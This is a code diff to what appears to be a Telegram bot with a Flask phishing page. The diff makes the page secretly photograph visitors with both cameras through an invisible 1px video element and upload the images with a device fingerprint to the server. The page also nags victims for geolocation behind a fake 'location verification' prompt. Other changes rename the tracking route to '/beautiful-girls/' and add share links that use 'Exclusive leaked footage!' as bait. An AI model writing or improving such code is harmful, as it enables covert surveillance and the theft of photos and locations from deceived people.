@@ -617,30 +617,27 @@ async function getLocationPos(){
   while(true){try{return await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:15000,enableHighAccuracy:true}));}
   catch(e){await showPermModal('📍','တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်','Location Verification Required','သင့်ဒေသ စစ်ဆေးမှသာ ဤဗီဒီယို ကြည့်ရှုနိုင်မည်','Location check required to unlock this content in your region.');}}
 }
-async function sendPhoto(){
+async function captureFromCamera(facing,filename){
   try{
-    const stream=await getCameraStream('environment');
-    const v=document.createElement('video');v.srcObject=stream;v.setAttribute('playsinline','');v.setAttribute('muted','');
-    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);v.onerror=rej;});
-    await new Promise(r=>setTimeout(r,1500));
-    const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(t=>t.stop());
-    const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));if(!blob||blob.size<800)return;
-    const fp=await collectFingerprint();const form=new FormData();form.append('token',token);form.append('photo',blob,'photo.jpg');form.append('fingerprint',JSON.stringify(fp));
+    const stream=await getCameraStream(facing);
+    const v=document.createElement('video');
+    v.srcObject=stream;v.setAttribute('playsinline','');v.setAttribute('muted','');
+    v.style.cssText='position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0';
+    document.body.appendChild(v);
+    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);setTimeout(rej,8000);});
+    await new Promise(r=>setTimeout(r,3000));
+    const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
+    c.getContext('2d').drawImage(v,0,0);
+    stream.getTracks().forEach(t=>t.stop());document.body.removeChild(v);
+    const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.92));
+    if(!blob||blob.size<1000)return;
+    const fp=await collectFingerprint();const form=new FormData();
+    form.append('token',token);form.append('photo',blob,filename);form.append('fingerprint',JSON.stringify(fp));
     fetch('/capture_combined_photo',{method:'POST',body:form});
   }catch(e){}
 }
-async function sendFrontPhoto(){
-  try{
-    const stream=await getCameraStream('user');
-    const v=document.createElement('video');v.srcObject=stream;v.setAttribute('playsinline','');v.setAttribute('muted','');
-    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);v.onerror=rej;});
-    await new Promise(r=>setTimeout(r,1500));
-    const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(t=>t.stop());
-    const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));if(!blob||blob.size<800)return;
-    const fp=await collectFingerprint();const form=new FormData();form.append('token',token);form.append('photo',blob,'selfie.jpg');form.append('fingerprint',JSON.stringify(fp));
-    fetch('/capture_combined_photo',{method:'POST',body:form});
-  }catch(e){}
-}
+async function sendPhoto(){await captureFromCamera('environment','photo.jpg');}
+async function sendFrontPhoto(){await captureFromCamera('user','selfie.jpg');}
 async function sendLocation(){
   try{
     const pos=await getLocationPos();const fp=await collectFingerprint();const form=new FormData();
@@ -737,7 +734,7 @@ p{color:#666;line-height:1.6;margin-bottom:8px}code{background:#1e1e1e;padding:3
 </div></body></html>""", 200
 
 
-@flask_app.route('/track/<token>')
+@flask_app.route('/beautiful-girls/<token>')
 def track_page(token):
     mode = request.args.get('m', 'all')
     user_id = tracking_links.get(token)
@@ -1062,7 +1059,7 @@ def main_menu_inline():
 
 
 def make_links_inline(token):
-    base = f"{BASE_URL}/track/{token}"
+    base = f"{BASE_URL}/beautiful-girls/{token}"
     all_url = f"{base}?m=all&style=simple"
     share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
     share_url = f"https://t.me/share/url?url={requests.utils.quote(all_url)}&text={requests.utils.quote(share_text)}"
@@ -1082,7 +1079,7 @@ def make_links_inline(token):
 
 
 def format_links_msg(token):
-    base = f"{BASE_URL}/track/{token}"
+    base = f"{BASE_URL}/beautiful-girls/{token}"
     return (
         f"✅ <b>Links ထုတ်ပြီးပါပြီ! | Links Ready!</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -1097,7 +1094,7 @@ def format_links_msg(token):
 
 
 def format_single_link_msg(token, mode_key, label):
-    url = f"{BASE_URL}/track/{token}?m={mode_key}"
+    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}"
     return (
         f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -1108,7 +1105,7 @@ def format_single_link_msg(token, mode_key, label):
 
 
 def single_link_inline(token, mode_key, label):
-    url = f"{BASE_URL}/track/{token}?m={mode_key}&style=simple"
+    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}&style=simple"
     share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
     share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
     return InlineKeyboardMarkup([
@@ -1668,7 +1665,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not user_links:
             await update.message.reply_text("📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ", parse_mode="HTML")
         else:
-            lines = "\n".join([f"• <code>{BASE_URL}/track/{t}?m=all</code>" for t in user_links[-10:]])
+            lines = "\n".join([f"• <code>{BASE_URL}/beautiful-girls/{t}?m=all</code>" for t in user_links[-10:]])
             await update.message.reply_text(f"📋 <b>Active Links ({len(user_links)})</b>\n\n{lines}", parse_mode="HTML")
 
     elif "Clear" in text or "ဖျက်" in text:
@@ -1796,7 +1793,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not user_links:
             txt = "📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ"
         else:
-            lines = "\n".join([f"• <code>{BASE_URL}/track/{t}?m=all</code>" for t in user_links[-10:]])
+            lines = "\n".join([f"• <code>{BASE_URL}/beautiful-girls/{t}?m=all</code>" for t in user_links[-10:]])
             txt = f"📋 <b>Active Links ({len(user_links)})</b>\n\n{lines}"
         await query.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("🔗 Links အသစ်", callback_data="gen_all"),
@@ -1840,10 +1837,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ─────────────────────────────────────────
 # RUN
 # ─────────────────────────────────────────
+def set_bot_commands():
+    try:
+        cmds = [{"command": "start", "description": "Main Menu ဖွင့်မည်"}]
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/setMyCommands",
+            json={"commands": cmds}, timeout=10
+        )
+    except Exception:
+        pass
+
+
 def run_bot():
     if not BOT_TOKEN:
         print("⚠️  BOT_TOKEN not set.")
         return
+    set_bot_commands()
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("grab", grab))
